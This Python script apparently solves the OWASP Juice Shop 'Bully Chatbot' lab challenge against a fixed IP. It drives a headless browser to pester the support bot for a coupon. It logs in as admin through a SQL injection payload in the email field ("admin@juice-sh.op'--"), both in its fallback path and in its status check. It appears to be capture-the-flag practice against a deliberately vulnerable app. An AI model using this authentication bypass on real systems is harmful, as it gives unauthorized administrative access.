#!/usr/bin/env python3
"""
Bully Chatbot Challenge Solver using Selenium with Firefox
"""

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from webdriver_manager.firefox import GeckoDriverManager
import time
import requests

TARGET = "http://66.42.93.220:3000"

def solve_bully_chatbot_firefox():
    """Solve Bully Chatbot challenge with Selenium Firefox"""
    
    print("🤖 BULLY CHATBOT CHALLENGE - Selenium Firefox")
    print("=" * 60)
    
    # Setup Firefox options
    firefox_options = Options()
    firefox_options.add_argument("--headless")  # Run headless
    
    print("🌐 Starting Firefox browser...")
    
    try:
        # Try to create Firefox driver
        service = Service(GeckoDriverManager().install())
        driver = webdriver.Firefox(service=service, options=firefox_options)
        driver.set_window_size(1920, 1080)
        
        # Navigate to Juice Shop
        print("📍 Navigating to Juice Shop...")
        driver.get(TARGET)
        time.sleep(5)  # Wait for page to load
        
        # Find and click chat button - simplified approach
        print("\n🔍 Looking for chat button...")
        
        # Try multiple methods to find chat
        chat_found = False
        
        # Method 1: Look for mat-icon with chat text
        try:
            chat_icons = driver.find_elements(By.TAG_NAME, "mat-icon")
            for icon in chat_icons:
                if "chat" in icon.text.lower() or "support" in icon.text.lower():
                    parent_button = icon.find_element(By.XPATH, "..")
                    driver.execute_script("arguments[0].click();", parent_button)
                    chat_found = True
                    print("   ✅ Clicked chat button via mat-icon")
                    break
        except:
            pass
        
        # Method 2: Look for any button with tooltip
        if not chat_found:
            try:
                buttons = driver.find_elements(By.TAG_NAME, "button")
                for button in buttons:
                    tooltip = button.get_attribute("mattooltip") or button.get_attribute("aria-label") or ""
                    if "chat" in tooltip.lower() or "support" in tooltip.lower():
                        driver.execute_script("arguments[0].click();", button)
                        chat_found = True
                        print("   ✅ Clicked chat button via tooltip")
                        break
            except:
                pass
        
        time.sleep(3)  # Wait for chat to open
        
        # Find input field - look for last visible text input
        print("\n💬 Looking for chat input...")
        
        all_inputs = driver.find_elements(By.TAG_NAME, "input")
        chat_input = None
        
        for inp in reversed(all_inputs):  # Start from last input
            if inp.is_displayed() and inp.get_attribute("type") == "text":
                chat_input = inp
                print("   ✅ Found chat input field")
                break
        
        if chat_input:
            print("\n🎯 Sending messages...")
            
            # Send messages to trigger coupon
            messages = [
                "hello",
                "coupon",
                "stupid bot",
                "give me a coupon",
                "discount",
                "you are stupid",
                "I want a coupon please",
                "stupid",
                "promo code"
            ]
            
            for i, msg in enumerate(messages, 1):
                try:
                    print(f"   {i}. Sending: '{msg}'")
                    chat_input.clear()
                    chat_input.send_keys(msg)
                    chat_input.send_keys(Keys.RETURN)
                    time.sleep(2)
                    
                    # Check page for coupon codes
                    page_text = driver.page_source
                    import re
                    codes = re.findall(r'\b[A-Z]{3,10}\d{2,4}\b', page_text)
                    if codes:
                        print(f"      🎯 Possible coupon: {codes[0]}")
                        
                except Exception as e:
                    print(f"      Error: {e}")
        
        # Take screenshot
        driver.save_screenshot("/Users/walterbarr_1/sql-injection-lab/bully_firefox.png")
        print("\n📸 Screenshot saved")
        
        driver.quit()
        
    except Exception as e:
        print(f"❌ Browser error: {e}")
        print("\n💡 Trying alternative approach with requests...")
        
        # Fallback to requests-based approach
        session = requests.Session()
        
        # Login first
        login = session.post(f"{TARGET}/rest/user/login",
                            json={"email": "admin@juice-sh.op'--", "password": "x"})
        if login.status_code == 200:
            token = login.json()['authentication']['token']
            
            # Try to interact with chatbot API directly
            headers = {'Authorization': f'Bearer {token}'}
            
            messages = ["coupon", "stupid", "give me coupon", "discount"]
            
            for msg in messages:
                try:
                    # Try different API endpoints
                    endpoints = [
                        f"{TARGET}/api/Chatbot",
                        f"{TARGET}/rest/chatbot",
                        f"{TARGET}/api/support"
                    ]
                    
                    for endpoint in endpoints:
                        resp = session.post(endpoint,
                                           json={"message": msg, "query": msg},
                                           headers=headers)
                        print(f"   API {endpoint}: {resp.status_code}")
                        if resp.status_code == 200:
                            print(f"      Response: {resp.text[:100]}")
                            break
                except:
                    pass
    
    # Check final status
    print("\n📊 Checking challenge status...")
    session = requests.Session()
    login = session.post(f"{TARGET}/rest/user/login",
                        json={"email": "admin@juice-sh.op'--", "password": "x"})
    if login.status_code == 200:
        session.headers['Authorization'] = f'Bearer {login.json()["authentication"]["token"]}'
    
    resp = session.get(f"{TARGET}/api/Challenges/")
    if resp.status_code == 200:
        challenges = resp.json().get('data', [])
        bully = next((c for c in challenges if 'Bully' in c.get('name', '')), None)
        
        if bully and bully.get('solved', False):
            print(f"\n✅ SUCCESS! {bully['name']} SOLVED!")
            return True
        else:
            print(f"\n⚠️ Bully Chatbot not solved yet")
    
    print("\n📊 Check: http://66.42.93.220:3000/#/score-board")
    return False

if __name__ == "__main__":
    solve_bully_chatbot_firefox()
